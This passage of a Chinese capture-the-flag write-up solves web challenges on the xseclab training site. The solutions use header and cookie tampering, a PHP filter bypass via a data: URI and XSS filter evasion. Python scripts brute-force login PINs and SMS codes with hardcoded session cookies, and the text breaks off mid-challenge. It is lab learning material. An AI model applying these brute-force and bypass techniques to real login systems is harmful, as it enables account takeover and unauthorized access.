JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0='
while True:
try:
code = base64.b64decode(code)
except:
print(code)
break
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>据说MD5加密很安全，真的是么？&lt;/p>
&lt;p>那么很好判断了，md5加密的，拿到cmd5解密，得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>种族歧视&lt;/p>
&lt;p>改请求头，Accept-Language条目中的zh-CN,zh;删除之后访问即可&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HAHA浏览器&lt;/p>
&lt;p>依旧是改请求头，User-Agent条目一行的内容替换成HAHA之后访问即可&lt;/p>
&lt;/li>
&lt;li>
&lt;p>key究竟在哪里呢？&lt;/p>
&lt;p>用firefox自带的web控制台查看页面返回头，看到有个key条目….&lt;/p>
&lt;/li>
&lt;li>
&lt;p>key又找不到了&lt;/p>
&lt;p>bp，先抓一次search_key.php,过去发现里面一个a标签藏着个链接key_is_herenow.php访问得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>冒充登陆用户&lt;/p>
&lt;p>内容说必须要登录才能得到key，于是bp抓包发现请求头里的cookie&lt;/p>
&lt;pre tabindex="0">&lt;code> cookie:Login=0
&lt;/code>&lt;/pre>&lt;p>把0改成1访问得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>比较数字大小&lt;/p>
&lt;p>tips说只要比服务器上的数字即可，于是看源代码发现input框maxlength=3，直接web控制台修改然后一路999999999999999999999打过去，得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本地的诱惑&lt;/p>
&lt;p>估计这道题是要改请求头里的ip头的改成127.0.0.1，但是右键查看源代码直接就发现php代码都告诉key了…&lt;/p>
&lt;/li>
&lt;li>
&lt;p>就不让你访问&lt;/p>
&lt;p>一开始以为用后台扫描器扫扫会出来，发现没有，只有一个robots.txt，纳闷，没后台，于是手动搜后台，找不到，看writeup发现需要关注一下这个robots.txt，然后看了内容发现有个disallow行，复制到url进入发现进到一个页面里，根据内容再在url后添加login.php访问得到key&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="脚本关">脚本关&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>key又又找不到了&lt;/p>
&lt;p>用不着脚本，直接bp抓，得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>快速口算&lt;/p>
&lt;p>脚本如下:&lt;/p>
&lt;pre tabindex="0">&lt;code> #coding:utf8
import requests
import re
url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
cookie = 'PHPSESSID=6cf93ef3760b1c0c1f1736ce6e891c91'
headers = {
'Cookie':cookie
}
req = requests.get(url=url,headers=headers)
pat = '([0-9]*?)\*([0-9]*?)\+([0-9]*?)\*\(([0-9]*?)\+([0-9]*?)\)'
data = re.compile(pat).findall(req.text)[0]
answer = int(data[0])*int(data[1])+int(data[2])*(int(data[3])+int(data[4]))
data = {
'v':str(answer)
}
req = requests.post(url=url,headers=headers,data=data)
print(req.text)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>这个题目是空的&lt;/p>
&lt;p>。。。还以为是要用bp抓包把请求头某些条目清空，结果看writeup发现 提交null即可….&lt;/p>
&lt;/li>
&lt;li>
&lt;p>怎么就是不弹出key呢？&lt;/p>
&lt;p>解决方法在js代码里，根据tips要让它弹窗，把那个function弹窗的删掉点击弹窗得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>逗比验证码第一期&lt;/p>
&lt;p>tips说验证码有和没有一个样，也就是说也许可以一个验证码提交多次，于是真的可以.写个脚本循环即可得到key&lt;/p>
&lt;pre tabindex="0">&lt;code> #coding:utf8
import requests,re
url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
cookie = 'PHPSESSID=6cf93ef3760b1c0c1f1736ce6e891c91'
headers = {
'Cookie':cookie
}
pat = 'key'
for i in range(1000,10000):
data = {
'username':'admin',
'pwd':str(i),
'vcode':'FH2S'
}
req = requests.post(url=url,headers=headers,data=data)
if len(re.compile(pat).findall(req.text)) != 0:
print(req.text)
break
else:
print(i)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>逗比验证码第二期&lt;/p>
&lt;p>没思路看writeup说验证码直接赋空值也可以提交，于是脚本同上…&lt;/p>
&lt;p>得到经验! 一定要自己多试试目标代码的逻辑啊&lt;/p>
&lt;/li>
&lt;li>
&lt;p>逗比的验证码第三期（SESSION）&lt;/p>
&lt;p>。。试了下发现亦然不验证vcode，于是脚本同上…得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>微笑一下就能过关了&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/1757998.jpg" alt="img" />&lt;/p>
&lt;p>题目长这样:)这题当初也没写出来，它的php源代码给了，是这样的&lt;/p>
&lt;pre tabindex="0">&lt;code> &amp;lt;-?php header(&amp;quot;content-type:=&amp;quot;&amp;quot; text=&amp;quot;&amp;quot; html;=&amp;quot;&amp;quot; charset=&amp;quot;utf-8&amp;quot;);&amp;quot; if=&amp;quot;&amp;quot; (isset($_get['view-source']))=&amp;quot;&amp;quot; {=&amp;quot;&amp;quot; show_source(__file__);=&amp;quot;&amp;quot; exit();=&amp;quot;&amp;quot; }=&amp;quot;&amp;quot; include('flag.php');=&amp;quot;&amp;quot; $smile=&amp;quot;1;&amp;quot; (!isset=&amp;quot;&amp;quot; ($_get['^_^']))=&amp;quot;&amp;quot; (preg_match=&amp;quot;&amp;quot; ('=&amp;quot;&amp;quot; \.=&amp;quot;&amp;quot; ',=&amp;quot;&amp;quot; $_get['^_^']))=&amp;quot;&amp;quot; %=&amp;quot;&amp;quot; [0-9]=&amp;quot;&amp;quot; http=&amp;quot;&amp;quot; $_get['^_^'])=&amp;quot;&amp;quot; )=&amp;quot;&amp;quot; https=&amp;quot;&amp;quot; ftp=&amp;quot;&amp;quot; telnet=&amp;quot;&amp;quot; _=&amp;quot;&amp;quot; $_server['query_string']))=&amp;quot;&amp;quot; ($smile)=&amp;quot;&amp;quot; (@file_exists=&amp;quot;&amp;quot; ($_get['^_^']);=&amp;quot;&amp;quot; ($smile=&amp;quot;==&amp;quot; &amp;quot;(●'◡'●)&amp;quot;)=&amp;quot;&amp;quot; die($flag);=&amp;quot;&amp;quot; ?-=&amp;quot;&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>分析一下知道，要提交一个不同于它正则搜索内容的”微笑”才能过，那么一一尝试&lt;/p>
&lt;p>基本上是要提交一个这样的query_string&lt;/p>
&lt;pre tabindex="0">&lt;code> target.cn/index.php?^_^=(●'◡'●)
&lt;/code>&lt;/pre>&lt;p>但是这个php里写了很多正则过滤查询，有哪些呢&lt;/p>
&lt;ol>
&lt;li>
&lt;p>不允许为 . | % | [0-9] | [http] | [https] | ftp | telnet | _&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果查询内容跟服务器本地文件有重名则也会被过滤&lt;/p>
&lt;/li>
&lt;li>
&lt;p>必须要得到一个文件内容为(●’◡’●) 的文件&lt;/p>
&lt;p>那么怎么做?&lt;/p>
&lt;p>第一步想到可以将 下划线_用url编码%5F代替；&lt;/p>
&lt;p>第二第三步怎么办呢?&lt;/p>
&lt;p>我一开始想给自己的云服务器上贴个文件，url再拉过来，但是发现过滤了http/https/ftp/telnet,怎么办，没思路，也许可以尝试url或者其它编码?&lt;/p>
&lt;p>…直到学到了data协议，这个协议是这样的，基本现在的流行浏览器都支持它，&lt;/p>
&lt;p>它定义的内容可以作为小文件插入到其它文档中，怎么定义呢?
一般格式:&lt;/p>
&lt;pre tabindex="0">&lt;code>data:[][;charset=][;base64],
&lt;/code>&lt;/pre>&lt;p>data: :协议头,它标识这个内容为一个data URI资源 mime type: test/plain 以文本格式展示, image/jpeg ,以jpeg图片形式展示 charset=&lt;/p>
&lt;p>设置编码，默认US-ASCII,可以设置charset=gbk或UTF-8,unicode等等 base64是一个可选项，设置base64编码设定 最后一项是要编写的内容，可以是纯文本编写的内容，也可以是经过base64编码的内容。 比如我们这里写成:&lt;/p>
&lt;pre tabindex="0">&lt;code>data:text/plain;charset=unicode,(●'◡'●)
&lt;/code>&lt;/pre>&lt;p>所以最后的query_string构造如下:&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/78037407.jpg" alt="img" />&lt;/p>
&lt;p>得到key&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>逗比的手机验证码&lt;/p>
&lt;p>不知道这题要考什么，可能是要考 逻辑问题? 先点一次获取验证码，submit发现不对，提示需要尾号67登录，于是先用66获得验证码，再改成67登录获得key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>基情燃烧的岁月&lt;/p>
&lt;p>这题长这样…&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/88350385.jpg" alt="img" />&lt;/p>
&lt;p>于是，先尝试向login.php爆破&lt;/p>
&lt;p>爆破脚本:&lt;/p>
&lt;pre tabindex="0">&lt;code>#coding:utf8
import requests
url = 'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'
cookie = 'PHPSESSID=7f6cfa6d3e4fbcd3904aaf3cf6a5eeb3'
headers = {
'Cookie':cookie
}
temp_text = 'vcode or username error'
d = False
for vcode in range(100,1000):
data = {
'username':'13388886666',
'vcode':str(vcode),
'getcode':'1'
}
req = requests.post(url=url,headers=headers,data=data)
if temp_text != req.text:
print(req.text)
break
&lt;/code>&lt;/pre>&lt;p>爆破出来这个…&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/88775865.jpg" alt="img" />&lt;/p>
&lt;p>这是暗示要爆破前任的号码? 改一下username继续爆破得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>验证码识别&lt;/p>
&lt;p>这题看来要用到验证码识别…之前写的一个验证码识别脚本改一改用来识别看看这个&lt;/p>
&lt;p>先等着改天做吧…&lt;/p>
&lt;/li>
&lt;li>
&lt;p>XSS基础关&lt;/p>
&lt;p>题目中js代码如下:&lt;/p>
&lt;pre tabindex="0">&lt;code>orgAlert = window.alert;
ok = 0;
var HackingLab=&amp;quot;success!&amp;quot;;
function newAlert(a) {
window.alert = orgAlert;
if (a == HackingLab) {
if (ok == 0) ok = 1;
alert(a);
$.post(&amp;quot;./getkey.php?ok=1&amp;quot;,{'url':location.href,'ok':ok},function(data){
console.log(data);
});
showkey();
} else {
alert(a);
alert(&amp;quot;Please use alert(HackingLab)!!&amp;quot;);
}
}
window.alert = newAlert;
function showkey(){
//XSS题目要自觉.....无论如何都是可以绕过的,索性不加密不编码js了,大家一起玩吧.
var url=&amp;quot;./getkey.php&amp;quot;;
$.post(url,{&amp;quot;getkey&amp;quot;:&amp;quot;sera&amp;quot;},function(data){
$(&amp;quot;#msg&amp;quot;).text(data);
});
}
&lt;/code>&lt;/pre>&lt;p>研究一下发现这串js代码重新定义了alert函数，界面alert一个HackingLab就可以得到key了&lt;/p>
&lt;p>输入框试试能不能xss，发现可以，直接输入什么就直接打在原页面上。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>那么直接贴串alert进去就得到key了
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>XSS基础2:简单绕过&lt;/p>
&lt;p>跟上一关相同，只是过滤了script关键词，于是构造别的标签亦然可以绕过，比如我构造的:&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/23195023.jpg" alt="img" />&lt;/p>
&lt;p>提交得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>XSS基础3:检测与构造&lt;/p>
&lt;p>检查了过滤列表，发现过滤的是 单双引号+某些script关键字组合&lt;/p>
&lt;p>思考一下，想到用eval函数来绕过，于是:&lt;/p>
